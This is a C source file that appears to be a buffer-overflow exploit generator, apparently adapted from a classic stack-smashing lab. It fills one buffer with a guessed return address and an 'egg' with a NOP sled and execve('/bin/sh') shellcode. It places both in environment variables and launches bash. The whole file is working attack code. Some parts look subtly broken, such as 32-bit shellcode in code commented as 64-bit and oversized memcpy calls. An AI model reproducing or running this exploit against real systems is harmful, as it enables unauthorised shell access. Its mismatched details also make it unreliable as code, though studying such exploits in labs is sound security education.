#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define DEFAULT_OFFSET              0
#define DEFAULT_BUFFER_SIZE         1024
//used when there is not enough consecutive memory
#define DEFAULT_EGG_SIZE            4096
#define NOP                         0x90

//shell code: 
char shellCode[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long getRsp(void){
    //64bit machine requires different name of registers
    //$esp -> $rsp and $eax -> $rax
    __asm__("mov %rsp, %rax");
}

void main(int argc, char *argv[]){
    //create pointers for buffer, pointer, and egg
    char *buffer, *pointer, *egg;
    //create address pointers
    long *addressPointer, address;
    int offset = DEFAULT_OFFSET;
    int bufferSize = DEFAULT_BUFFER_SIZE;
    int eggSize = DEFAULT_EGG_SIZE;

    //convert strings to int
    if(argc > 1){
        bufferSize = atoi(argv[1]);
    }
    if(argc > 2){
        offset = atoi(argv[2]);
    }
    if(argc > 3){
        eggSize = atoi(argv[3]);
    }

    //when buffer does not allocate
    if(!(buffer = malloc(bufferSize))){
        printf("Can't allocate memory.\n");
        exit(0);
    }

    //when egg does not allocate
    if(!(egg = malloc(eggSize))){
        printf("Can't allocate memory.\n");
        exit(0);
    }

    //get base address
    address = getRsp() - offset;
    //point to address
    addressPointer = (long *) pointer;
    //print out base address 
    printf("Using address: 0x%lx\n", address);

    //copy buffer into pointer 
    pointer = buffer;
    //address pointer 
    addressPointer = (long *) pointer;
    //copy address values into address point
    for(int i = 0; i < bufferSize; i += 8){
        *(addressPointer++) = address;
    }

    //copy egg into pointer
    pointer = egg;
    //copy NOP sled into pointer to pad 
    for(int i = 0; i < eggSize - strlen(shellCode) - 1; i++){
        *(pointer++) = NOP;
    }

    //copy shellcode contents into pointer
    for(int i = 0; i < strlen(shellCode); i++){
        *(pointer++) = shellCode[i];
    }

    //null terminating character for buffer
    buffer[bufferSize - 1] = '\0';
    //null terminating character for egg
    egg[eggSize - 1] = '\0';

    
    memcpy(egg, "EGG = ", 8);
    putenv(egg);
    memcpy(buffer, "RET = ", 8);
    putenv(buffer);
    system("/bin/bash");
}
